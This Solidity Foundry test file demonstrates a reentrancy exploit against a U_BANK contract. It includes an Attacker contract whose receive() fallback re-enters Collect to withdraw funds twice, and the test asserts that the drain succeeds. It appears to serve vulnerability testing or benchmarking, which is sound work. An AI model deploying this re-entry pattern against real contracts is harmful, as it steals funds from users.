
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK} from "../src/U_BANK.sol";
import {Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {

    U_BANK public bank;
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        bank = new U_BANK(address(log));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal < 2 ether);
        vm.assume(attackVal <= type(uint128).max / 2);

        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.warp(block.timestamp + 100);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = U_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: val * 2}(block.timestamp + 1);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        attackAmount = val;

        victim.Collect(val);

        uint finalBalance = address(this).balance;
        uint finalRecorded = victim.Acc(address(this)).balance;
        if (attackCallCount == 2 && finalRecorded == 0 && finalBalance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
